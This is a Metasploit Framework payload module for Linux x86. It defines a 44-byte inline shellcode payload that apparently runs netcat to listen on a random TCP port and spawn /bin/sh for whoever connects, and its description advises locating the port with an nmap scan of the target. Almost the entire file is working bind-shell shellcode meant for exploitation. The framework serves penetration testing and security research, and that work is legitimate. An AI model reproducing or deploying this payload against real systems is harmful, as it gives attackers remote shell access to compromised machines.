##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 44

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Bind TCP Random Port Inline',
      'Description'   => %q{
        Listen for a connection with a random port and spawn a command shell.
        Use nmap to discover the open port: 'nmap -sS -p- target'.
      },
      'Author'        => 'Aleh Boitsau <infosecurity[at]ya.ru>',
      'License'       => BSD_LICENSE,
      'References'    => ['URL', 'https://www.exploit-db.com/exploits/41631'],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Payload'       =>
        {
        "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d" +
        "\x6c\x65\x2f\x89\xe7\x52\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69" +
        "\x6e\x89\xe3\x52\x57\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"

        }
      ))
  end

end
